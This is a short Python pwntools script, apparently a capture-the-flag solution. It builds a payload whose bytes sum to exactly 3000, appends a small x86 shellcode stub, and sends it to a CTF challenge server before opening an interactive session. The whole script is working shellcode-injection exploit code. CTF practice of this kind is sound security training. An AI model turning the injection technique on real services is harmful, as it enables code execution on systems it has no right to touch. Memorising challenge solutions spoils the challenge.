#!/usr/bin/env python3
from pwn import *

K          = 3000
stub       = bytes([0xB8, 0xB8, 0x0B, 0, 0, 0xC3])     # mov eax,0x0BB8 ; ret
stub_sum   = sum(stub)
fill_sum   = K - stub_sum
filler     = b"\x01"*fill_sum + b"\x00"*(K-fill_sum)
payload    = filler + stub
assert sum(payload) == K

print(len(payload))
io = remote("chal.ctf-league.osusec.org", 1320)
io.send(payload)
io.interactive()